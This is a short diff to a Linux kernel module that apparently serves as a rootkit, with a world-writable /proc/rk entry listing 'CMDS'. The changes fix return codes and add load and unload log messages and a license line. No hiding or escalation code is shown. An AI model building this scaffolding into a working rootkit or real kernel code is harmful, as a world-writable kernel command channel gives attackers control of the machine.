@@ -79,7 +79,7 @@ static int __init procfs_init(void)
 {
     proc_rk = proc_create("rk", 0666, NULL, &proc_rk_fops);
     if(proc_rk == NULL)
-        return -ENOMEM;
+        return 0;
 
     sprintf(module_status,
         "CMDS:\n\
@@ -88,7 +88,7 @@ static int __init procfs_init(void)
     size = strlen(module_status);
     temp = size;
 
-    return 0;
+    return 1;
 }
 
 static void procfs_clean(void)
@@ -102,6 +102,7 @@ static void procfs_clean(void)
 
 static int __init rk_init(void)
 {
+    printk("Adding Module!\n");
     if(!procfs_init())
     {
         procfs_clean();
@@ -113,8 +114,10 @@ static int __init rk_init(void)
 
 static void __exit rk_exit(void)
 {
+    printk("Removing Module!\n");
     procfs_clean();
 }
 
+MODULE_LICENSE("GPL");
 module_init(rk_init);
 module_exit(rk_exit);
